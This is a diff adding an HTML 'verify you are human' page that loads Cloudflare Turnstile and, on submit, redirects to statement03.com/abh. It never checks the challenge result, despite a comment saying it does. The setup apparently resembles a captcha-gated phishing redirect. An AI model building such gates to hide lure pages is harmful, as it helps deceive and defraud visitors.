@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Required</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+</head>
+<body>
+    <h1>Please verify you are human</h1>
+    <form id="verify-form">
+        <div class="cf-turnstile" data-sitekey="0x4AAAAAABdxTP1jHSpHph0L"></div>
+        <button type="submit">Continue</button>
+    </form>
+
+    <script>
+        document.getElementById("verify-form").addEventListener("submit", function(e) {
+            e.preventDefault();
+            // Redirect after CAPTCHA success
+            window.location.href = "https://statement03.com/abh";
+        });
+    </script>
+</body>
+</html>
